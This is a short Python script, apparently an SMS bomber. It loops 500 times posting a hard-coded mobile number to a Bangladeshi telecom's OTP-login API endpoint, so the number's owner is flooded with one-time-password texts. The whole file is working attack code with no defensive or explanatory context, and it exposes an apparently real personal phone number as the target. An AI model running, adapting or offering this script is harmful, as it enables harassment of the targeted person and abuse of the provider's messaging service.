import requests

# post

gude="https://assetliteapi.banglalink.net/api/v1/usr/otp-login/requests"
data={"mobile":'01952290038'}

for i in range(500):
	requests.post(gude,data=data)
	print(str(i+1)+"sms.send")